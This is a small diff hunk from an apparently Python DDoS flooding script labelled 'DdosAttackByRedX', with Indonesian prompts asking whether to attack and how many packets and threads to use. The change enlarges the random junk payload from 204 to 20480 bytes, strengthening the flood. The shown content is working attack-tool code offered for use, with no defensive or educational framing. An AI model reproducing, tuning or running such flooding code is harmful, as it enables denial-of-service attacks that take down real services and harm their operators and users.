@@ -32,7 +32,7 @@ choice = str(input("DdosAttackByRedX | Serang Ga Ni?(y/n):"))
 times = int(input("DdosAttackByRedX | Packets:"))
 threads = int(input("DdosAttackByRedX | Threads:"))
 def run():
-    data = random._urandom(204)
+    data = random._urandom(20480)
     i = random.choice(("[*]","[!]","[#]"))
     while True:
         try:
